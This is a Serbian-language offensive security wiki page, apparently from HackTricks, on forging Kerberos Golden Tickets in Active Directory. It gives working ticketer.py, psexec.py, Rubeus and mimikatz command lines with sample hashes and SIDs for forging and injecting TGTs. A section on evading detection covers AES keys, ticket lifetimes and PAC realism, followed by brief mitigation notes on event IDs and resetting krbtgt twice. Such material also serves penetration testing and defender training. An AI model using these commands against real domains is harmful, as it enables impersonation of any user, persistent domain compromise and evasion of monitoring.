# Golden Ticket

{{#include ../../banners/hacktricks-training.md}}

## Golden ticket

**Golden Ticket** napad podrazumeva **kreiranje legitimnog Ticket Granting Ticket-a (TGT) koji se predstavlja kao bilo koji korisnik** pomoću **NTLM hash-a Active Directory (AD) krbtgt naloga**. Ova tehnika je posebno korisna jer **omogućava pristup bilo kom servisu ili mašini** unutar domena u svojstvu impersoniranog korisnika. Važno je zapamtiti da se **credentials krbtgt naloga nikada ne ažuriraju automatski**.<sup>[[1]](#references)</sup>

Za **dobijanje NTLM hash-a** krbtgt naloga mogu se koristiti različite metode. Može se izdvojiti iz **Local Security Authority Subsystem Service (LSASS) procesa** ili **NT Directory Services (NTDS.dit) fajla** koji se nalazi na bilo kom Domain Controller-u (DC-u) unutar domena. Osim toga, **izvršavanje DCsync napada** predstavlja još jednu strategiju za dobijanje ovog NTLM hash-a, a može se sprovesti pomoću alata kao što su **lsadump::dcsync modul** u Mimikatz-u ili **secretsdump.py skripta** kompanije Impacket. Važno je naglasiti da su za sprovođenje ovih operacija obično potrebne **domain admin privilegije ili sličan nivo pristupa**.<sup>[[2]](#references)</sup>

Iako NTLM hash predstavlja validnu metodu za ovu namenu, iz razloga operativne bezbednosti **izričito se preporučuje** **kreiranje falsifikovanih ticket-a pomoću Advanced Encryption Standard (AES) Kerberos ključeva (AES128 i AES256)**. Ovo je još važnije u modernim domenima jer se **upotreba RC4 postepeno ukida** i mnogo je uočljivija u Kerberos telemetriji.<sup>[[5]](#references)</sup>
```bash:From Linux
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

```bash:From Windows
# Rubeus
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_domain_sid> /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

# Example
.\Rubeus.exe golden /rc4:25b2076cda3bfd6209161a6c78a69c1c /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /user:stegosaurus /ptt /ldap /nowrap

#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
### Savremene napomene o izradi ticket-a

Kad god je moguće, **prvo upitajte LDAP i SYSVOL**, a zatim falsifikujte ticket koristeći stvarnu policy domena i PAC vrednosti korisnika, umesto da ih ručno izmišljate:<sup>[[4]](#references)</sup>
```bash
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:<username> /ldap /printcmd /nowrap
```
- `/ldap` zahteva od DC-a podatke o korisniku, grupi, NetBIOS-u i pravilima koji se koriste za izgradnju realističnijeg PAC-a.
- `/printcmd` ispisuje offline komandnu liniju koja sadrži preuzeta PAC polja, što je korisno ako kasnije želite da falsifikujete istu kartu bez ponovnog pristupanja LDAP-u.
- `/extendedupndns` dodaje novije `UpnDns` PAC elemente koji sadrže `samAccountName` i SID naloga.
- `/oldpac` uklanja novije `Requestor` i `Attributes` PAC buffere; ovo je prvenstveno korisno za testiranje kompatibilnosti sa starijim okruženjima, a ne za podrazumevani tradecraft.

Iz Linux-a, novije verzije Impacket-a takođe podržavaju dodavanje novijih PAC struktura i postavljanje realističnog perioda važenja:
```bash
python3 ticketer.py -aesKey <krbtgt_aes256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-user-id 500 -groups 512,513,518,519 -duration 10 \
-extra-pac administrator
```
- `-duration` je izražen u **satima**. Podrazumevana vrednost je **10 godina**, što je upadljivo.
- `-extra-pac` dodaje novije `UPN_DNS` PAC informacije.
- `-old-pac` forsira legacy PAC raspored.
- `-extra-sid` je koristan kada su PAC-u potrebni dodatni SID-ovi (na primer, u scenarijima eskalacije iz child domena ka parent domenu, koji su obrađeni u [SID-History Injection](sid-history-injection.md)).

**Kada** je **golden Ticket injected**, možete pristupiti deljenim fajlovima **(C$)** i izvršavati services i WMI, pa možete koristiti **psexec** ili **wmiexec** za dobijanje shell-a (izgleda da shell ne možete dobiti putem winrm-a).

### Zaobilaženje uobičajenih detekcija

Najčešći načini za detekciju golden ticket-a zasnivaju se na **inspekciji Kerberos saobraćaja** na mreži. Mimikatz podrazumevano **potpisuje TGT na 10 godina**, što će izgledati anomalno u naknadnim TGS zahtevima napravljenim pomoću njega.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Koristite parametre `/startoffset`, `/endin` i `/renewmax` da kontrolišete početni pomak, trajanje i maksimalan broj obnavljanja (sve vrednosti su u minutima).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Nažalost, životni vek TGT-a nije zabeležen u 4769 događajima, tako da ove informacije nećete pronaći u Windows event logovima. Međutim, ono što možete korelisati jeste **prisustvo 4769 događaja bez prethodnog 4768 događaja**. **Nije moguće zatražiti TGS bez TGT-a**, pa ako ne postoji zapis da je TGT izdat, možemo zaključiti da je falsifikovan offline.

U **novijim Windows verzijama**, Event IDs **4768** i **4769** takođe pružaju mnogo bolju **telemetriju tipova enkripcije**. Falsifikovani TGT/TGS koji koristi **RC4 (`0x17`)** u domenu u kom `krbtgt`, klijenti i servisi već imaju AES ključeve mnogo je lakše uočiti nego pre nekoliko godina. Ovo je još jedan razlog da se preferiraju **Golden Tickets zasnovani na AES-u** i da se normalna Kerberos politika domena prati što je moguće preciznije.

Drugi OPSEC problem je **vernost PAC-a**. Ticket-e sa nemogućim članstvima u grupama, nedostajućim novijim PAC baferima ili metapodacima naloga koji se ne poklapaju sa LDAP-om lakše je otkriti kada defenders validiraju sadržaj PAC-a u odnosu na podatke u AD-u. Ako vam je potreban TGT koji izgleda kao da ga je zaista izdao DC, pogledajte:

{{#ref}}
diamond-ticket.md
{{#endref}}

Postoje i **ograničenja persistence-a koja zavise od okruženja**. Nalog `krbtgt` čuva **istoriju lozinki od 2**, pa falsifikovani TGT može ostati validan nakon **prvog** resetovanja `krbtgt` lozinke ako je potpisan prethodnim ključem. Zbog toga defenders poništavaju Golden Tickets tako što **dva puta resetuju `krbtgt`** i između resetovanja čekaju najmanje maksimalno trajanje ticket-a u domenu.<sup>[[3]](#references)</sup>

Da biste **zaobišli ovu detekciju**, pogledajte diamond tickets.

### Mere ublažavanja

- 4624: Account Logon
- 4672: Admin Logon
- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Drugi mali trikovi koje defenders mogu primeniti jesu **upozorenja za 4769 događaje kod osetljivih korisnika**, kao što je podrazumevani administrator domena, kao i upozorenja na **korišćenje RC4 za `krbtgt`** u domenima koji obično izdaju AES ticket-e.<sup>[[5]](#references)</sup>

## Reference

- [1] [Kerberos (II): How to attack Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Kerberos: Golden Tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
- [3] [AD Forest Recovery - Reset the krbtgt password | Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password)
- [4] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [5] [Microsoft – How to manage Kerberos KDC usage of RC4 for service account ticket issuance (CVE-2026-20833)](https://support.microsoft.com/en-us/topic/how-to-manage-kerberos-kdc-usage-of-rc4-for-service-account-ticket-issuance-changes-related-to-cve-2026-20833-1ebcda33-720a-4da8-93c1-b0496e1910dc)

{{#include ../../banners/hacktricks-training.md}}
